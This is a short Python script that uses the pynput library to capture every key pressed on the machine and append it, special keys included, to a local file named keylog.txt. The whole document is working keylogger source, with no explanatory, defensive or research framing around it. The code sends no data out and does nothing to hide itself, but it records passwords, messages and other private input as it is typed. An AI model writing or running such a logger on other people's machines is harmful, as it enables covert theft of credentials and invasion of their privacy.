from pynput.keyboard import Listener

# Specify the log file to store the keystrokes
log_file = "keylog.txt"

def on_press(key):
    """Callback function that gets called every time a key is pressed."""
    try:
        # Write the key pressed to the log file
        with open(log_file, "a") as f:
            f.write(str(key.char))
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f"[{key}]")

def main():
    # Set up the listener for keyboard events
    with Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
